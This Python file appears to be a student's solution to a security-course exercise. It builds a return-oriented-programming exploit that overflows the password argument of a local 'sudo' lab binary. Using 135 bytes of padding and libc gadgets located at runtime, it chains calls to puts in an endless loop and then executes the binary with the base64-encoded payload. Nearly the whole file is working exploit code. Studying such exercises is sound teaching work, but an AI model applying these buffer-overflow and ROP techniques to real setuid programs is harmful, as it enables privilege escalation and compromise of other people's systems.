import os
import sys
import base64
import struct

import addresses
from infosec.utils import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
   """
   This function returns the (pre-encoded) `password` argument to be sent to
   the `sudo` program.
   This data should cause the program to execute our ROP-chain for printing our
   message in an endless loop. Make sure to return a `bytes` object and not an
   `str` object.
   NOTES:
   1. Use `addresses.PUTS` to get the address of the `puts` function.
   2. Don't write addresses of gadgets directly - use the search object to
      find the address of the gadget dynamically.
   WARNINGS:
   0. Don't delete this function or change it's name/parameters - we are going
      to test it directly in our tests, without running the main() function
      below.
   Returns:
      The bytes of the password argument.
   """
   libc_search = GadgetSearch(LIBC_DUMP_PATH)

   buff_offset = 135 * b'A'

   # mov puts address to ebp
   pop_ebp = libc_search.find("pop ebp")
   puts_to_ebp = struct.pack('<III', pop_ebp, addresses.PUTS, addresses.PUTS)

   # skip 4 + string's address
   skip_four = libc_search.find('add esp, 0x4')
   post_call = struct.pack('<II', skip_four, addresses.STRING_ADDRESS)
   
   # loop
   pop_esp_ind = libc_search.find('pop esp')
   pop_esp = struct.pack('<II', pop_esp_ind, addresses.LOOP_START_ADDRESS)

   take_me_string = b'Take me (205611544) to your leader!\x00'

   payload = buff_offset + puts_to_ebp + post_call + pop_esp + take_me_string
   return(payload)
    


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
